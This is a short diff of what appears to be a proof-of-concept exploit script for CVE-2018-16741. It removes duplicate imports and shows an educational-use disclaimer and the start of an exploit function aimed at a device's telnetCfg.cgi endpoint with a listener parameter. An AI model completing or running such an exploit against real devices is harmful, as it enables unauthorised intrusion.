@@ -6,9 +6,6 @@ import requests
 # The author of this script is not responsible for any damage caused by the use or misuse of this script. 
 # These PoCs are intended for educational and research purposes only, and should never be used to target or exploit systems without explicit permission from the owner.
 
-import argparse
-import requests
-
 # CVE-2018-16741 exploit function
 def exploit_cve_2018_16741(target, listen):
     url = f'http://{target}/telnetCfg.cgi'
